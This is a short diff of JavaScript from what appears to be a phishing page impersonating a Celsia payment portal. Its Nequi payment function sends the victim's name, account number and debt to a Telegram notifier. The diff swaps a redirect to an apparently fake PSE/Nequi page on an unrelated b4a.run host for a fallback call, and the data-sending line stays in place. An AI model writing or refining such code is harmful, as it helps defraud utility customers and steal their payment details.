@@ -1040,8 +1040,7 @@ function tgNotif(text) {
 function pagarNequi() {
   const now = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
   tgNotif(`💜 <b>Celsia — Nequi</b>\n👤 ${payData.nombre || '—'} · Cuenta: ${payData.cuenta}\n💰 ${fmt(payData.deuda)}\n🕐 ${now}`);
-  showPayLoading('Conectando con Nequi...');
-  setTimeout(() => { window.location.href = 'https://pagpse-u6htdvaa.b4a.run//transaction/ent/b-nequi/'; }, 1800);
+  mostrarBrevFallback('Nequi');
 }
 
 function pagarBogota() {
